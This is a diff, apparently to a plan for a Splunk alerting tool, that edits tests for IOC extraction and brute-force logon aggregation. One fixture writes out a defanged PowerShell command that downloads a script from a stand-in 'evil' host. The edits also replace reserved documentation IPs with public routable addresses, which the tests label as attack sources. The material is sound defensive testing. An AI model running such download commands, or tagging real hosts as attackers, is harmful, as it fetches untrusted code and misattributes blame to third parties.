@@ -778,11 +778,11 @@ def test_network_event_yields_public_destination_only(splunk_rows):
 def test_command_line_urls_and_ips_are_extracted():
     ev = to_canonical({
         "_time": "2026-08-11T06:37:25Z", "EventCode": "1",
-        "CommandLine": "powershell iwr hxxp://evil[.]example.com/a.ps1 -o x; curl 203.0.113.9; python tool.py 10.0.0.2",
+        "CommandLine": "powershell iwr hxxp://evil[.]example.com/a.ps1 -o x; curl 45.33.32.157; python tool.py 10.0.0.2",
     })
     iocs = extract_iocs(ev)
     assert "evil.example.com" in iocs
-    assert "203.0.113.9" in iocs
+    assert "45.33.32.157" in iocs
     assert "10.0.0.2" not in iocs
     assert "tool.py" not in iocs
 
@@ -1204,8 +1204,8 @@ def test_different_rules_on_same_event_make_separate_alerts():
 
 def test_distinct_brute_force_sources_get_distinct_ids():
     """Regression: every brute-force alert used to hash to the same ID."""
-    fails = [ev(i, event_code="4625", src_ip="203.0.113.5", target_user="admin") for i in range(6)]
-    fails += [ev(i + 10, event_code="4625", src_ip="198.51.100.7", target_user="admin") for i in range(7)]
+    fails = [ev(i, event_code="4625", src_ip="45.33.32.156", target_user="admin") for i in range(6)]
+    fails += [ev(i + 10, event_code="4625", src_ip="185.220.101.4", target_user="admin") for i in range(7)]
     agg = aggregate_failed_logons(fails, threshold=5, bucket_seconds=300)
     groups = group_hits([RuleHit(RULE, e, c) for e, c in agg], "default", 300)
     assert sorted(g.count for g in groups) == [6, 7]
@@ -1213,11 +1213,11 @@ def test_distinct_brute_force_sources_get_distinct_ids():
 
 
 def test_aggregate_failed_logons_threshold_and_buckets():
-    under = [ev(i, event_code="4625", src_ip="203.0.113.5") for i in range(4)]
+    under = [ev(i, event_code="4625", src_ip="45.33.32.156") for i in range(4)]
     assert aggregate_failed_logons(under, threshold=5, bucket_seconds=300) == []
-    spread = [ev(i * 400, event_code="4625", src_ip="203.0.113.5") for i in range(6)]  # one per bucket
+    spread = [ev(i * 400, event_code="4625", src_ip="45.33.32.156") for i in range(6)]  # one per bucket
     assert aggregate_failed_logons(spread, threshold=5, bucket_seconds=300) == []
-    ok = [ev(i, event_code="4625", src_ip="203.0.113.5") for i in range(5)]
+    ok = [ev(i, event_code="4625", src_ip="45.33.32.156") for i in range(5)]
     (rep, count), = aggregate_failed_logons(ok, threshold=5, bucket_seconds=300)
     assert count == 5 and rep.event_id == "e0"
 
@@ -1413,14 +1413,14 @@ def test_real_registry_row_keeps_process_and_key(splunk_rows):
 def test_grouped_alert_reports_count_and_window():
     t0 = datetime(2026, 8, 11, 6, 0, tzinfo=timezone.utc)
     events = [CanonicalEvent(event_id=f"e{i}", ts=t0 + timedelta(seconds=i), event_code="4625",
-                             host="LAB", host_key="lab", src_ip="203.0.113.5", target_user="admin", user="admin")
+                             host="LAB", host_key="lab", src_ip="45.33.32.156", target_user="admin", user="admin")
               for i in range(6)]
     group = group_hits([RuleHit(_rule("brute_force_login"), events[0], 6)], "default", 300)[0]
     doc = build_alert_doc(group, "default")
     assert doc["count"] == 6
-    assert "6 failures from 203.0.113.5" in doc["title"]
-    assert doc["source_ip"] == "203.0.113.5"
-    assert "203.0.113.5" in doc["extracted_iocs"]
+    assert "6 failures from 45.33.32.156" in doc["title"]
+    assert doc["source_ip"] == "45.33.32.156"
+    assert "45.33.32.156" in doc["extracted_iocs"]
 ```
 
 - [ ] **Step 2: Run to verify failure**
@@ -1792,7 +1792,7 @@ async def test_failed_logons_aggregate_into_one_alert_per_source(db):
         return {"_time": (base + timedelta(seconds=i)).isoformat(), "EventCode": "4625", "host": "LAB",
                 "IpAddress": ip, "TargetUserName": "admin", "LogonType": "3", "_cd": f"1:{ip}:{i}"}
 
-    rows = [row(i, "203.0.113.5") for i in range(6)] + [row(i, "198.51.100.7") for i in range(5)] + [row(0, "192.0.2.9")]
+    rows = [row(i, "45.33.32.156") for i in range(6)] + [row(i, "185.220.101.4") for i in range(5)] + [row(0, "91.240.118.2")]
     new = await _service(db, FakeSplunk([rows])).fetch_and_store_alerts()
     brute = [a for a in new if a["rule_name"] == "brute_force_login"]
     assert sorted(a["count"] for a in brute) == [5, 6]
